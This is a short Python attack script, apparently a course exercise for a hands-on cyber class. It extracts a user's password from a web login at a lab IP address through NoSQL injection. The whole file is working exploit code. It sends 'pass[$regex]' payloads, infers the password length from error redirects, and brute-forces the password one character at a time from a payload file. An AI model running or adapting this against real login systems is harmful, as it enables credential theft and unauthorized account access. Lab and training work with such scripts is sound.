
"""
    readme
    Modify currIp to ip to perform attack on
    Performs noSQL enumeration to discover the user's password
    Prints user's password if found
    
    Eth Drelles
    12.20.2024
    Hands-On Cyber F24
    
    
"""
import requests
import csv
currIp = '10.10.10.127'
print("Current victim ip is: "+currIp)


#function to send a malicious post request, returns request object
def send_post(test_ip, test_pass):
    payload = {'pass[$regex]':'^'+test_pass+'$'}
    ip = "http://"+test_ip
    request = requests.post(ip, data=payload, allow_redirects=False)
    return request

#function to determine length of password, returns int
def find_num_pass(test_ip):
    currentPass = '.'
    count = 0
    response = send_post(test_ip=test_ip, test_pass=currentPass)
    while response.headers.get('location').find("err") != -1:
        count+=1
        currentPass=currentPass+"."
        response = send_post(test_ip=test_ip, test_pass=currentPass)
        if count == 100:
            break
    count+=1
    return count

#function to determine if server returned an error, returns 1 if error is found
def find_err(response):
    if response.headers.get('location').find("err") == -1:
        return 0
    else:
        return 1
        
#find length of pass for counting
numPass = find_num_pass(currIp)
builtPass = []
#supply payloads txt
read = csv.reader(open('/home/kali/Documents/payloads.txt', 'r'))
payloads = []
#create payloads list
for row in read:
    payloads.append(row)
count = 0
#create builtPass list
while count < numPass:
    builtPass.append(".")
    count+=1
count = 0
#iterate through each char
for workingChar in builtPass:
    #test payload
    for payload in payloads:
        payload= "".join(payload)
        builtPass[count]=payload
        strBuiltPass= "".join(builtPass)
        response = send_post(test_ip=currIp, test_pass=strBuiltPass)
        #if no error is found (successful password), break out of loop
        if find_err(response) == 0:
            break
    count+=1
print("Password for user is: "+ "".join(builtPass))
